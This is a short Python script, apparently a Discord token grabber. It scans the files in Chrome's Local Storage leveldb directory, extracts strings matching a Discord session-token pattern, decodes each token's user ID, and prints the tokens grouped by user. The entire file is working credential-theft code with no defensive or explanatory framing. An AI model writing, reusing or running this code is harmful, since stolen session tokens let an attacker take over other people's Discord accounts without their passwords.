import re
import os
import base64
import typing


TOKEN_REGEX_PATTERN = r'[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}'


def get_tokens_from_file(file_path: str) -> typing.Union[list[str], None]:

    with open(file_path, encoding="utf-8", errors="ignore") as text_file:
        try:
            file_contents = text_file.read()
        except PermissionError:
            return None

    tokens = re.findall(TOKEN_REGEX_PATTERN, file_contents)

    return tokens if tokens else None


def get_user_id_from_token(token: str) -> typing.Union[None, str]:

    try:
        discord_user_id = base64.b64decode(
            token.split(".", maxsplit=1)[0] + "=="
        ).decode("utf-8")
    except UnicodeDecodeError:
        return None

    return discord_user_id


def get_tokens_from_path(base_path: str) -> typing.Dict[str, set]:

    file_paths = [
        os.path.join(base_path, filename) for filename in os.listdir(base_path)
    ]

    id_to_tokens: typing.Dict[str, set] = dict()

    for file_path in file_paths:
        potential_tokens = get_tokens_from_file(file_path)

        if potential_tokens is None:
            continue

        for potential_token in potential_tokens:
            discord_user_id = get_user_id_from_token(potential_token)

            if discord_user_id is None:
                continue

            if discord_user_id not in id_to_tokens:
                id_to_tokens[discord_user_id] = set()

            id_to_tokens[discord_user_id].add(potential_token)

    return id_to_tokens


def main() -> None:

    chrome_path = os.path.join(
        os.getenv("LOCALAPPDATA"),
        r"Google\Chrome\User Data\Default\Local Storage\leveldb"
    )

    tokens = get_tokens_from_path(chrome_path)

    print(tokens)


if __name__ == "__main__":
    main()
